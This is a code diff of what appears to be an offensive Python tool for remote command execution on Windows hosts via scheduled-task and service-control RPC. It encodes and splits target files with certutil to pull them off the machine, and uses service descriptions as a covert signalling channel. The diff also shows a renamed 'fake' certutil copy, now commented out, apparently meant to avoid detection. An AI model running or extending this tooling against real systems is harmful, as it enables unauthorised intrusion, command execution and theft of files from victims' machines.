@@ -252,7 +252,7 @@ def delete_bat_gen_file(bat_prefix,servicename='',hService='',schtasks_name='',s
 def delete_inter_file(bat_file_name='',copied_xml_file_name='xml_file_name',file_part_1_name='file_part_1_name',
                       desc_header_file_name='desc_header_file_name',desc_tail_file_name='desc_tail_file_name',
                       cmd_result_file_name='cmd_result_file_name',new_xml_file='new_xml_file',
-                    sch_backup_filename='sch_backup_filename',    fake_certutil_name = 'fake_certutil_name',
+                      sch_backup_filename='sch_backup_filename',    fake_certutil_name = 'fake_certutil_name',
                       split_out_dir_on_target='split_out_dir_on_target',
                       servicename='lpServiceName',hService='hService',svcctl='svcctl',tschctl='tschctl',  ps_file_name='ps_file_name',schtasks_name='schtasks_name',service_desc_marker='service_desc_marker'):
 
@@ -293,7 +293,7 @@ $outputFile = "{0}_{1:0000}" -f $outputPrefix, $index;$index++;Set-Content -Path
         count = count + 1
         finish_mark = generate_random_string(5)
         command = "echo %s>>%s.ps1&&sc description %s \"%s\"" % (
-        line, ps_file_name, service_name, service_desc_marker + finish_mark + service_desc_marker)
+            line, ps_file_name, service_name, service_desc_marker + finish_mark + service_desc_marker)
         wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
         tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
         while True:
@@ -1053,9 +1053,9 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
             # 同时还要创建一个输出目录，用于切分文件
             download_split_out_dir_on_target = generate_random_string(5)
             print('download_split_out_dir_on_target: ' + download_split_out_dir_on_target)
-            command = f"copy certutil.exe {download_fake_certutil_name}.exe&&md {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
-
-            wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
+            # command = f"copy certutil.exe {download_fake_certutil_name}.exe&&md {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+            # 
+            # wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
             # 需要写入一个对文件进行拆分的bat脚本
             # 然后需要对文件进行编码
             # 根据certutil的输出，一行是64字节，16行就是1KB，1MB就是1024*16行
@@ -1067,11 +1067,11 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
             out_dir = generate_random_string(5)
 
             powershell_finis_finisssssh_mark=write_pwershell(svcctl=svcctl, hService=hService, schtasks_name=schtasks_name, service_name=lpServiceName,
-                            service_desc_marker=service_desc_marker,
-                            ps_file_name=ps_file_name, encoded_file_name=encoded_file_name, out_dir=download_split_out_dir_on_target)
+                                                             service_desc_marker=service_desc_marker,
+                                                             ps_file_name=ps_file_name, encoded_file_name=encoded_file_name, out_dir=download_split_out_dir_on_target)
             # 对目标文件进行编码
             finish_mark = generate_random_string(5)
-            command = f"{download_fake_certutil_name}.exe -f -encode {src_path} {encoded_file_name}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+            command = f"certutil.exe -f -encode {src_path} {encoded_file_name}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
 
             wrap_cmd_exec(tschctl, command, schtasks_name, finish_mark)
             # 对目标文件进行拆分
@@ -1111,7 +1111,7 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
 
 
 
-               # command = f"schtasks /create /xml {download_split_out_dir_on_target}\\output_{x} /tn {schtasks_name} /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+                # command = f"schtasks /create /xml {download_split_out_dir_on_target}\\output_{x} /tn {schtasks_name} /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
                 #finish_mark = generate_random_string(5)
                 wrap_cmd_exec(tschctl, command, schtasks_name_for_upload, finish_mark)
                 # 获取内容，简单处理后直接写入文件
@@ -1173,7 +1173,7 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
             wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
             continue
         else:
-            command = f'{your_cmd} > {cmd_result_file_name} 2>&1 && sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"'
+            command = f'{your_cmd} > {cmd_result_file_name} 2>&1 && sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"||sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"'
         wrap_hSchRpcRegisterTask(tschctl, command = command, schtasks_name = schtasks_name, action=tsch.TASK_UPDATE)
         tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
         # 循环等待，获取服务描述来判断命令执行是否已经完成
@@ -1250,7 +1250,7 @@ echo ^<Description^>>description_header&&echo ^</Description^>^</RegistrationInf
                       split_out_dir_on_target=split_out_dir_on_target,
                       servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl,
                       ps_file_name=ps_file_name,
-    schtasks_name=schtasks_name,service_desc_marker=service_desc_marker)
+                      schtasks_name=schtasks_name,service_desc_marker=service_desc_marker)
     # 删除bat文件产生的bat文件
     # delete_bat_gen_file(bat_gen_bat_prefix,schtasks_name=schtasks_name,servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl)
 
